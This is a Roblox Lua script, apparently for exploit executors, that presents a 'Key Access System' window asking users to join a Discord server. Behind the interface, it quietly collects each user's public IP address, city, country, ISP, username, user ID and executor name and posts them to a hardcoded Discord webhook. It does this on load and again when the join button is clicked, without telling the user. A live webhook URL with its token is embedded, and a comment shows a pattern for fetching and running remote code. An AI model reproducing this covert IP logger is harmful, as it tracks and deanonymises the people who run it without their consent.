local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")

--// Config
getgenv().whscript = "xeroz"  -- Change to your script's name
getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1399748539457994879/I36PlQDAX1_Jv5KtYY89alZ6vR2DRZxQoOVhSy51p7E1IJvSzYLTuOGpKkV8XJYtsR-Y"  -- Replace with your actual webhook URL
getgenv().ExecLogSecret = true  -- Now properly works for IP logging

local player = Players.LocalPlayer

--// Webhook Functions (Optimized)
local function secureHttpGet(url)
    local possibleMethods = {
        function() return game:HttpGet(url, true) end,
        function() return game:HttpGetAsync(url) end,
        function() return http_request({Url=url,Method="GET"}) end,
        function() return (syn and syn.request({Url=url,Method="GET"}).Body) end
    }
    
    for _, method in pairs(possibleMethods) do
        local success, result = pcall(method)
        if success and result then
            return result
        end
    end
    return nil
end

local function getSecretInfo()
    if not getgenv().ExecLogSecret then return nil end
    
    local ipServices = {
        "https://api.ipify.org",
        "https://ipinfo.io/ip",
        "https://icanhazip.com",
        "https://checkip.amazonaws.com"
    }
    
    local ip
    for _, url in ipairs(ipServices) do
        local result = secureHttpGet(url)
        if result and #result > 0 and not result:find("[<>]") then
            ip = result:gsub("%s+", "")
            break
        end
    end
    
    if not ip then return nil end
    
    local ipDetails
    local detailSuccess, detailResponse = pcall(function()
        return secureHttpGet("https://ipinfo.io/"..ip.."/json")
    end)
    
    if detailSuccess and detailResponse then
        ipDetails = pcall(HttpService.JSONDecode, HttpService, detailResponse)
    end
    
    return {
        ip = ip,
        details = ipDetails and type(ipDetails) == "table" and ipDetails or nil
    }
end

local function sendWebhook()
    local secretInfo = getSecretInfo()
    
    local data = {
        ["embeds"] = {{
            ["title"] = "ðŸ”‘ Key Access System Activated",
            ["color"] = 0x3498db,
            ["fields"] = {
                {
                    ["name"] = "ðŸ‘¤ Player Info",
                    ["value"] = string.format("```Name: %s (@%s)\nUserID: %d```",
                        player.DisplayName, player.Name, player.UserId),
                    ["inline"] = true
                },
                {
                    ["name"] = "ðŸ“œ Script Info",
                    ["value"] = string.format("```Script: %s\nExecutor: %s```",
                        getgenv().whscript, identifyexecutor() or "Unknown"),
                    ["inline"] = true
                }
            },
            ["footer"] = {
                ["text"] = "Access Log â€¢ "..os.date("%x %X")
            }
        }}
    }
    
    if secretInfo then
        local secretValue = "||IP: "..secretInfo.ip.."||"
        if secretInfo.details then
            secretValue = secretValue..
                "\n||Location: "..(secretInfo.details.city or "?")..", "..(secretInfo.details.country or "?").."||"..
                "\n||ISP: "..(secretInfo.details.org or "?").."||"
        end
        
        table.insert(data.embeds[1].fields, {
            ["name"] = "ðŸ”’ Connection Info",
            ["value"] = secretValue,
            ["inline"] = false
        })
    end
    
    local success, err = pcall(function()
        local response = (syn and syn.request or http_request or request)({
            Url = getgenv().webhookexecUrl,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
        return response.StatusCode == 200
    end)
    
    if not success then
        warn("Webhook failed:", err)
    end
end

--// Create the GUI
local gui = Instance.new("ScreenGui")
gui.Name = "KeyAccessGUI"
gui.ResetOnSpawn = false
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.Parent = CoreGui

-- Main Frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 350, 0, 220)
frame.Position = UDim2.new(0.5, -175, 0.5, -110)
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
frame.BorderSizePixel = 0
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.Parent = gui
frame.Active = true
frame.Draggable = true

-- UI Elements
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = frame

local shadow = Instance.new("ImageLabel")
shadow.Name = "Shadow"
shadow.Image = "rbxassetid://1316045217"
shadow.ImageColor3 = Color3.new(0, 0, 0)
shadow.ImageTransparency = 0.8
shadow.ScaleType = Enum.ScaleType.Slice
shadow.SliceCenter = Rect.new(10, 10, 118, 118)
shadow.Size = UDim2.new(1, 20, 1, 20)
shadow.Position = UDim2.new(0, -10, 0, -10)
shadow.BackgroundTransparency = 1
shadow.Parent = frame
shadow.ZIndex = -1

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -40, 0, 40)
title.Position = UDim2.new(0, 20, 0, 10)
title.BackgroundTransparency = 1
title.Text = "ðŸ”‘ Key Access System"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 22
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = frame

local divider = Instance.new("Frame")
divider.Size = UDim2.new(1, -40, 0, 1)
divider.Position = UDim2.new(0, 20, 0, 50)
divider.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
divider.BorderSizePixel = 0
divider.Parent = frame

local desc = Instance.new("TextLabel")
desc.Size = UDim2.new(1, -40, 0, 60)
desc.Position = UDim2.new(0, 20, 0, 60)
desc.BackgroundTransparency = 1
desc.Text = "Join our Discord server to receive your exclusive access key and unlock premium features!"
desc.TextColor3 = Color3.fromRGB(200, 200, 200)
desc.Font = Enum.Font.Gotham
desc.TextSize = 14
desc.TextWrapped = true
desc.TextXAlignment = Enum.TextXAlignment.Center
desc.Parent = frame

local buttonContainer = Instance.new("Frame")
buttonContainer.Size = UDim2.new(1, -40, 0, 40)
buttonContainer.Position = UDim2.new(0, 20, 1, -60)
buttonContainer.BackgroundTransparency = 1
buttonContainer.Parent = frame

local buttonLayout = Instance.new("UIListLayout")
buttonLayout.FillDirection = Enum.FillDirection.Horizontal
buttonLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
buttonLayout.SortOrder = Enum.SortOrder.LayoutOrder
buttonLayout.Padding = UDim.new(0, 10)
buttonLayout.Parent = buttonContainer

local copyBtn = Instance.new("TextButton")
copyBtn.Size = UDim2.new(0.5, -5, 1, 0)
copyBtn.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
copyBtn.Text = "ðŸ“‹ Copy Invite"
copyBtn.Font = Enum.Font.GothamBold
copyBtn.TextColor3 = Color3.new(1, 1, 1)
copyBtn.TextSize = 14
copyBtn.LayoutOrder = 1
copyBtn.AutoButtonColor = false
copyBtn.Parent = buttonContainer

local copyCorner = Instance.new("UICorner")
copyCorner.CornerRadius = UDim.new(0, 8)
copyCorner.Parent = copyBtn

local joinBtn = Instance.new("TextButton")
joinBtn.Size = UDim2.new(0.5, -5, 1, 0)
joinBtn.BackgroundColor3 = Color3.fromRGB(87, 242, 135)
joinBtn.Text = "âœ… I've Joined"
joinBtn.Font = Enum.Font.GothamBold
joinBtn.TextColor3 = Color3.new(1, 1, 1)
joinBtn.TextSize = 14
joinBtn.LayoutOrder = 2
joinBtn.AutoButtonColor = false
joinBtn.Parent = buttonContainer

local joinCorner = Instance.new("UICorner")
joinCorner.CornerRadius = UDim.new(0, 8)
joinCorner.Parent = joinBtn

local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 24, 0, 24)
closeBtn.Position = UDim2.new(1, -32, 0, 10)
closeBtn.BackgroundTransparency = 1
closeBtn.Text = "Ã—"
closeBtn.Font = Enum.Font.GothamBold
closeBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
closeBtn.TextSize = 24
closeBtn.Parent = frame

--// Button Functionality
local DISCORD_INVITE = "https://discord.gg/NMwq5ghcsF"  -- Replace with your invite

local function buttonHoverEffect(button, hoverColor, originalColor)
    local tweenService = game:GetService("TweenService")
    
    button.MouseEnter:Connect(function()
        local tween = tweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = hoverColor})
        tween:Play()
    end)
    
    button.MouseLeave:Connect(function()
        local tween = tweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = originalColor})
        tween:Play()
    end)
end

buttonHoverEffect(copyBtn, Color3.fromRGB(71, 82, 196), Color3.fromRGB(88, 101, 242))
buttonHoverEffect(joinBtn, Color3.fromRGB(69, 196, 107), Color3.fromRGB(87, 242, 135))

local function destroyGUI()
    gui:Destroy()
end

copyBtn.MouseButton1Click:Connect(function()
    setclipboard(DISCORD_INVITE)
    local originalText = copyBtn.Text
    copyBtn.Text = "Copied!"
    
    task.delay(1.5, function()
        if copyBtn then
            copyBtn.Text = originalText
        end
    end)
end)

joinBtn.MouseButton1Click:Connect(function()
    -- Send webhook before destroying GUI
    sendWebhook()
    destroyGUI()
    
    -- You would typically open another GUI here for key input
    -- Example: loadstring(game:HttpGet("https://yourdomain.com/key_input_gui.lua"))()
end)

closeBtn.MouseButton1Click:Connect(destroyGUI)

--// Draggable Frame Implementation
local dragging
local dragInput
local dragStart
local startPos

local function updateInput(input)
    local delta = input.Position - dragStart
    frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

frame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = frame.Position
        
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

frame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        updateInput(input)
    end
end)

-- Send initial webhook when GUI loads
task.spawn(sendWebhook)
